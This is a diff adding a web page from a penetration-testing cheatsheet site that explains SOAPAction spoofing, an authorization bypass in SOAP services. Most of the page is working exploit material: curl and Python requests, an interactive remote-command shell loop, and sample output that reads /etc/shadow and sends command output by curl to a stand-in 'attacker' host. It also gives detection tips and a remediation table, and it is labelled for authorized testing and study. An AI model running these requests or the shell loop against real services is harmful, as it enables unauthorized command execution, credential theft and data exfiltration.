@@ -1,0 +1,324 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SOAPAction Spoofing · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Web Services &amp; APIs</nav><h1>SOAPAction Spoofing</h1><p class="cx-lede">The canonical SOAP-specific bypass - when the server uses the SOAPAction HTTP header to determine which operation to execute but applies authorization on the body element, a mismatch lets you invoke a privileged operation while pretending to call a non-privileged one. Detection, exploitation pattern, the Login-body-with-ExecuteCommand-header payload, and the interactive shell loop.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1556</span><span class="cx-tag">D3FEND D3-IAA</span><span class="cx-tag">IMPACT AuthBypass, RCE</span><span class="cx-tag">OWASP A05, A07</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>SOAPAction spoofing exploits a server that determines which operation to execute solely from the <code>SOAPAction</code> HTTP header but applies authorization checks on the <code>&lt;soap:Body&gt;</code> operation element. Body says one (allowed) operation, header says another (privileged) one - the privileged one runs.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Confirm the privileged operation is restricted via body operation name
+curl -X POST http://target:3002/wsdl \
+     -H &#x27;Content-Type: text/xml&#x27; \
+     -H &#x27;SOAPAction: &quot;ExecuteCommand&quot;&#x27; \
+     --data &#x27;&lt;soap:Envelope&gt;...&lt;ExecuteCommandRequest&gt;&lt;cmd&gt;id&lt;/cmd&gt;&lt;/ExecuteCommandRequest&gt;...&#x27;
+# → &quot;This function is only allowed in internal networks&quot;
+
+# 2. Spoof: change body operation to an allowed one, keep header as privileged
+curl -X POST http://target:3002/wsdl \
+     -H &#x27;Content-Type: text/xml&#x27; \
+     -H &#x27;SOAPAction: &quot;ExecuteCommand&quot;&#x27; \
+     --data &#x27;&lt;soap:Envelope&gt;...&lt;LoginRequest&gt;&lt;cmd&gt;id&lt;/cmd&gt;&lt;/LoginRequest&gt;...&#x27;
+# → uid=0(root) gid=0(root) - privileged operation ran</code></pre></figure>
+<p>Success indicator: the operation that the SOAPAction header names - not the body element - produces output, indicating the server dispatched by header alone and ignored the body's operation name for authorization.</p>
+<h2 id="why-this-works">Why this works</h2>
+<p>SOAP duplicates the operation name in two places: the <code>SOAPAction</code> HTTP header and the root element inside <code>&lt;soap:Body&gt;</code>. Many server implementations dispatch operations based on the HTTP header (it's faster - no XML parsing needed to route the request). Some of those servers <em>also</em> apply authorization checks against the body's operation name (because that's where the application-level logic looks for the "what does the client want to do" signal).</p>
+<p>The mismatch is the bug:</p>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Looks at</th>
+<th>What it does</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Routing</td>
+<td><code>SOAPAction:</code> header</td>
+<td>Dispatches to handler for that operation</td>
+</tr>
+<tr>
+<td>Authorization</td>
+<td>Body <code>&lt;XxxRequest&gt;</code> element</td>
+<td>Decides whether to allow based on operation name</td>
+</tr>
+</tbody>
+</table>
+<p>If <code>SOAPAction: "ExecuteCommand"</code> but body is <code>&lt;LoginRequest&gt;</code>:</p>
+<ol>
+<li>Authorization layer sees <code>LoginRequest</code> → "Login is allowed externally, permit"</li>
+<li>Routing layer sees <code>SOAPAction: "ExecuteCommand"</code> → invokes ExecuteCommand handler</li>
+<li>ExecuteCommand handler reads parameters from the request body - sees <code>&lt;cmd&gt;id&lt;/cmd&gt;</code> inside <code>&lt;LoginRequest&gt;</code> and uses it</li>
+</ol>
+<p>The server's auth check and its actual dispatch disagree on what operation is being called. The auth check loses.</p>
+<h2 id="detection">Detection</h2>
+<p>Three indicators that a SOAP service might be vulnerable:</p>
+<h3 id="1-the-server-explicitly-mentions-the-soapaction-header">1. The server explicitly mentions the SOAPAction header</h3>
+<p>WSDL files always declare SOAPAction values. A server that <em>enforces</em> SOAPAction may reject mismatched bodies - but a server that uses SOAPAction as the <em>primary</em> dispatch is vulnerable.</p>
+<p>Test by inverting the relationship: send a body matching operation A with a SOAPAction header for operation B. If the response is shaped like B's response (different elements, different fields), header is the dispatcher.</p>
+<h3 id="2-different-operations-have-different-authorization-levels">2. Different operations have different authorization levels</h3>
+<p>The vulnerability only matters when the operations differ in privilege. Read the WSDL:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;wsdl:operation name=&quot;Login&quot;&gt;         &lt;!-- allowed externally --&gt;
+&lt;wsdl:operation name=&quot;ExecuteCommand&quot;&gt; &lt;!-- restricted --&gt;</code></pre></figure>
+<p>When a service exposes both a "public" operation and a "sensitive" operation, the public one is your decoy and the sensitive one is your target.</p>
+<h3 id="3-the-restricted-to-internal-networks-error">3. The "restricted to internal networks" error</h3>
+<p>The canonical tell:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>This function is only allowed in internal networks</code></pre></figure>
+<p>Or similar variations:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Access denied
+Not authorized
+Operation requires elevated privileges
+This endpoint is for administrative use</code></pre></figure>
+<p>These messages indicate the server is making an authorization decision at the application layer based on something the request carries - usually the body operation name. The spoofing bypass tests whether that decision can be fooled.</p>
+<h2 id="the-exploitation-pattern">The exploitation pattern</h2>
+<h3 id="step-1-baseline-confirm-the-restriction">Step 1 - Baseline: confirm the restriction</h3>
+<p>Send the privileged operation normally:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">import requests
+
+payload = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+  &lt;soap:Body&gt;
+    &lt;ExecuteCommandRequest xmlns=&quot;http://tempuri.org/&quot;&gt;
+      &lt;cmd&gt;whoami&lt;/cmd&gt;
+    &lt;/ExecuteCommandRequest&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;&#x27;&#x27;&#x27;
+
+r = requests.post(&#x27;http://target:3002/wsdl&#x27;,
+                  data=payload,
+                  headers={
+                      &#x27;Content-Type&#x27;: &#x27;text/xml; charset=utf-8&#x27;,
+                      &#x27;SOAPAction&#x27;: &#x27;&quot;ExecuteCommand&quot;&#x27;,
+                  })
+print(r.text)</code></pre></figure>
+<p>Expected response (the restriction firing):</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;soap:Envelope ...&gt;
+  &lt;soap:Body&gt;
+    &lt;ExecuteCommandResponse xmlns=&quot;http://tempuri.org/&quot;&gt;
+      &lt;success&gt;false&lt;/success&gt;
+      &lt;error&gt;This function is only allowed in internal networks&lt;/error&gt;
+    &lt;/ExecuteCommandResponse&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;</code></pre></figure>
+<p>The restriction is in place. Move to spoofing.</p>
+<h3 id="step-2-spoof-change-the-body-operation-keep-the-header">Step 2 - Spoof: change the body operation, keep the header</h3>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">import requests
+
+# CHANGED: body uses LoginRequest (allowed); header still says ExecuteCommand (privileged)
+payload = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+  &lt;soap:Body&gt;
+    &lt;LoginRequest xmlns=&quot;http://tempuri.org/&quot;&gt;
+      &lt;cmd&gt;whoami&lt;/cmd&gt;
+    &lt;/LoginRequest&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;&#x27;&#x27;&#x27;
+
+r = requests.post(&#x27;http://target:3002/wsdl&#x27;,
+                  data=payload,
+                  headers={
+                      &#x27;Content-Type&#x27;: &#x27;text/xml; charset=utf-8&#x27;,
+                      &#x27;SOAPAction&#x27;: &#x27;&quot;ExecuteCommand&quot;&#x27;,   # ← still privileged
+                  })
+print(r.text)</code></pre></figure>
+<p>Expected response (the bypass succeeding):</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;soap:Envelope ...&gt;
+  &lt;soap:Body&gt;
+    &lt;LoginResponse xmlns=&quot;http://tempuri.org/&quot;&gt;
+      &lt;success&gt;true&lt;/success&gt;
+      &lt;result&gt;root&lt;/result&gt;
+    &lt;/LoginResponse&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;</code></pre></figure>
+<p>Notice the response is wrapped in <code>&lt;LoginResponse&gt;</code> (matching the body's <code>LoginRequest</code>) but the <em>content</em> is the output of <code>whoami</code> - proving the server ran ExecuteCommand's handler despite advertising the response as a Login result.</p>
+<h3 id="three-things-to-change-for-the-spoof">Three things to change for the spoof</h3>
+<p>The minimal diff from a real privileged-operation call:</p>
+<ol>
+<li><strong>Body root element</strong>: change <code>&lt;ExecuteCommandRequest&gt;</code> to <code>&lt;LoginRequest&gt;</code> (or whichever allowed operation)</li>
+<li><strong>Body parameter names</strong>: keep <code>&lt;cmd&gt;</code> since that's what the privileged handler reads</li>
+<li><strong>SOAPAction header</strong>: keep the privileged operation name</li>
+</ol>
+<p>The HTTP method, Content-Type, namespace declarations, and other headers don't matter for the bypass.</p>
+<h3 id="why-the-parameter-name-stays-the-same">Why the parameter name stays the same</h3>
+<p>The privileged handler's code reads parameters by their XML element name, not by their position. <code>&lt;cmd&gt;whoami&lt;/cmd&gt;</code> inside <code>&lt;LoginRequest&gt;</code> is still readable as <code>cmd</code> to whatever handler ends up running. The body operation name affects authorization; the parameter names affect parameter parsing.</p>
+<p>If the privileged operation needs <code>&lt;cmd&gt;</code> and the spoof body uses <code>&lt;password&gt;</code> (Login's actual parameter), the handler won't find <code>cmd</code> and the attack fails. Match parameter names to the privileged operation, not the spoof operation.</p>
+<h2 id="interactive-shell-loop">Interactive shell loop</h2>
+<p>For RCE-style scenarios where you want to iterate commands:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">import requests
+
+URL = &#x27;http://target:3002/wsdl&#x27;
+
+template = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+  &lt;soap:Body&gt;
+    &lt;LoginRequest xmlns=&quot;http://tempuri.org/&quot;&gt;
+      &lt;cmd&gt;{cmd}&lt;/cmd&gt;
+    &lt;/LoginRequest&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;&#x27;&#x27;&#x27;
+
+headers = {
+    &#x27;Content-Type&#x27;: &#x27;text/xml; charset=utf-8&#x27;,
+    &#x27;SOAPAction&#x27;: &#x27;&quot;ExecuteCommand&quot;&#x27;,
+}
+
+while True:
+    try:
+        cmd = input(&#x27;$ &#x27;)
+    except (EOFError, KeyboardInterrupt):
+        break
+    payload = template.format(cmd=cmd)
+    r = requests.post(URL, data=payload, headers=headers)
+    print(r.text)</code></pre></figure>
+<p>Usage:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>$ python3 spoof_shell.py
+$ id
+&lt;...&gt;&lt;result&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/result&gt;...
+$ cat /etc/shadow
+&lt;...&gt;&lt;result&gt;root:$6$xxx:18900:...&lt;/result&gt;...
+$ python3 -c &quot;import os; os.system(&#x27;curl http://attacker/?$(id)&#x27;)&quot;
+&lt;...&gt;&lt;result&gt;&lt;/result&gt;...</code></pre></figure>
+<p>For a more polished implementation, parse the response XML and extract just the <code>&lt;result&gt;</code> content:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">import re
+output = re.search(r&#x27;&lt;result&gt;(.*?)&lt;/result&gt;&#x27;, r.text, re.DOTALL)
+print(output.group(1) if output else r.text)</code></pre></figure>
+<h2 id="variants-of-the-spoof">Variants of the spoof</h2>
+<h3 id="when-the-allowed-operation-isnt-named-login">When the allowed operation isn't named Login</h3>
+<p>Different services name their public-vs-privileged operations differently. The pattern is: find any operation with permissive authorization, then use its name as the spoof body root.</p>
+<p>Common pairs in real services:</p>
+<table>
+<thead>
+<tr>
+<th>Public (use as spoof)</th>
+<th>Privileged (use as SOAPAction header)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Login</code>, <code>Authenticate</code>, <code>SignIn</code></td>
+<td><code>ExecuteCommand</code>, <code>Admin*</code>, <code>Internal*</code></td>
+</tr>
+<tr>
+<td><code>Echo</code>, <code>Ping</code>, <code>HealthCheck</code></td>
+<td>Any state-changing operation</td>
+</tr>
+<tr>
+<td><code>GetCurrentTime</code>, <code>GetVersion</code></td>
+<td>Configuration operations</td>
+</tr>
+<tr>
+<td><code>Search</code>, <code>Lookup</code> (read-only)</td>
+<td><code>Create*</code>, <code>Delete*</code>, <code>Update*</code></td>
+</tr>
+</tbody>
+</table>
+<p>When in doubt, send a baseline call to every operation in the WSDL with empty parameters and observe which ones reply normally vs. with "access denied" - the former are spoof candidates.</p>
+<h3 id="when-soapaction-has-no-quotes">When SOAPAction has no quotes</h3>
+<p>Some servers tolerate <code>SOAPAction: ExecuteCommand</code> without quotes. Some require them. Try both:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">headers={&#x27;SOAPAction&#x27;: &#x27;&quot;ExecuteCommand&quot;&#x27;}    # spec-compliant
+headers={&#x27;SOAPAction&#x27;: &#x27;ExecuteCommand&#x27;}      # often works anyway</code></pre></figure>
+<h3 id="when-soapaction-is-a-full-url">When SOAPAction is a full URL</h3>
+<p>Some WSDLs declare SOAPAction as a URL:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;soap:operation soapAction=&quot;http://tempuri.org/ExecuteCommand&quot;/&gt;</code></pre></figure>
+<p>Use the full URL in the header:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">headers={&#x27;SOAPAction&#x27;: &#x27;&quot;http://tempuri.org/ExecuteCommand&quot;&#x27;}</code></pre></figure>
+<h3 id="when-the-spoof-requires-soap-12-format">When the spoof requires SOAP 1.2 format</h3>
+<p>SOAP 1.2 puts the action in <code>Content-Type</code> instead of a separate header:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">headers={
+    &#x27;Content-Type&#x27;: &#x27;application/soap+xml; charset=utf-8; action=&quot;ExecuteCommand&quot;&#x27;,
+}</code></pre></figure>
+<p>The body still uses the allowed operation name. The action parameter still names the privileged one.</p>
+<h3 id="when-the-server-rejects-the-mismatch-entirely">When the server rejects the mismatch entirely</h3>
+<p>Some servers validate that the SOAPAction matches the body root element. The spoof fails with a fault response:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>faultstring: SOAPAction mismatch with body element</code></pre></figure>
+<p>This server isn't spoofable. Look for other bypass paths (parameter pollution, malformed envelopes, alternate endpoints).</p>
+<h2 id="when-the-response-shape-is-confusing">When the response shape is confusing</h2>
+<p>The hallmark of a successful spoof: response shape matches the body's operation, response content matches the header's operation.</p>
+<p>If your spoof produces a response shaped like ExecuteCommandResponse (with <code>&lt;error&gt;</code> mentioning network restrictions), the body's operation name is what's being authorized - but the wrong one (you'd want <code>&lt;LoginResponse&gt;</code> shape with <code>&lt;result&gt;</code> content).</p>
+<p>If your spoof produces a 400 / 500 / fault response, the server validates the body matches the header. Different attack needed.</p>
+<p>If your spoof produces <code>&lt;LoginResponse&gt;</code> shape with empty <code>&lt;result&gt;</code> and no <code>&lt;success&gt;</code>, the spoof reached a path that doesn't error but doesn't run the privileged handler either - try variant approaches (different parameter names, different content types, different operation pairs).</p>
+<h2 id="reporting-findings">Reporting findings</h2>
+<p>A SOAPAction spoofing finding writes up as:</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Content</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Vulnerability</strong></td>
+<td>SOAP authorization decision uses request body operation name; dispatch uses SOAPAction HTTP header</td>
+</tr>
+<tr>
+<td><strong>Impact</strong></td>
+<td>Authentication / authorization bypass; ability to invoke privileged operations (in this case, OS command execution) without the required role</td>
+</tr>
+<tr>
+<td><strong>Reproduction</strong></td>
+<td>Send POST to <code>/wsdl</code> with body element <code>&lt;LoginRequest&gt;</code> containing <code>&lt;cmd&gt;id&lt;/cmd&gt;</code> and HTTP header <code>SOAPAction: "ExecuteCommand"</code></td>
+</tr>
+<tr>
+<td><strong>Severity</strong></td>
+<td>Critical when the spoofed operation runs OS commands; High when it modifies data; Medium when read-only</td>
+</tr>
+<tr>
+<td><strong>Remediation</strong></td>
+<td>Server-side dispatch and authorization must agree on operation. Either dispatch from body element (slower but consistent) or apply auth based on SOAPAction header (faster). Mismatched paths must be rejected with <code>400</code> or <code>soap:Fault</code>.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Pattern</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Baseline (privileged operation, normal call)</td>
+<td>Body <code>&lt;ExecuteCommandRequest&gt;</code> + header <code>SOAPAction: "ExecuteCommand"</code></td>
+</tr>
+<tr>
+<td>Spoof (privileged operation, bypass)</td>
+<td>Body <code>&lt;LoginRequest&gt;</code> + header <code>SOAPAction: "ExecuteCommand"</code></td>
+</tr>
+<tr>
+<td>Parameter naming</td>
+<td>Match the privileged operation's expected parameters (e.g., <code>&lt;cmd&gt;</code>), not the spoof operation's</td>
+</tr>
+<tr>
+<td>Allowed operation choices</td>
+<td>Login, Authenticate, Echo, GetCurrentTime, anything explicitly public</td>
+</tr>
+<tr>
+<td>Header format (SOAP 1.1)</td>
+<td><code>SOAPAction: "OperationName"</code> (quoted)</td>
+</tr>
+<tr>
+<td>Header format (SOAP 1.2)</td>
+<td><code>Content-Type: application/soap+xml; action="OperationName"</code></td>
+</tr>
+<tr>
+<td>Interactive shell</td>
+<td>Loop reading stdin, format into template, POST, print response</td>
+</tr>
+<tr>
+<td>Extract output</td>
+<td>Regex <code>&lt;result&gt;(.*?)&lt;/result&gt;</code> from response body</td>
+</tr>
+<tr>
+<td>When spoof fails entirely</td>
+<td>Server validates body-header match; move to other bypass classes</td>
+</tr>
+<tr>
+<td>When server returns mismatched response shape</td>
+<td>Successful spoof - body shape from body element, content from header dispatch</td>
+</tr>
+</tbody>
+</table>
+<p>For the full capstone chain that combines SOAPAction spoofing with SQL injection against a SOAP login form, see <a href="../capstone-chain/index.html">Capstone chain</a>.</p></article><nav class="cx-pager"><a class="cx-prev" href="../soap-basics/index.html">Previous: SOAP Basics</a><a class="cx-next" href="../api-vuln-context/index.html">Next: API Vuln Context</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
